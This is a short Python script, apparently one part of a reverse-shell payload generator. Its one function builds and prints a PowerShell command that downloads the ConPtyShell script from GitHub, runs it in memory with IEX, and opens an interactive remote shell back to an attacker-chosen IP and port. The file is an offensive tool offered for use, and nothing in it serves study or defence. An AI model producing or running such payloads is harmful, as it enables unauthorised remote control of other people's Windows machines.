from rich.console import Console
from rich.syntax import Syntax
from rich.style import Style
import time

console = Console()

def WindowsConPty(ip, port):
    payload = """IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell %s %d""" % (ip, port)
    myStyle = Style(color="#7780ff", bold=True)
    console.print("\nThe payload is: \n", style=myStyle)
    synt = Syntax(payload,"shell",theme='dracula', line_numbers=True)
    console.print(synt)
    print("\n")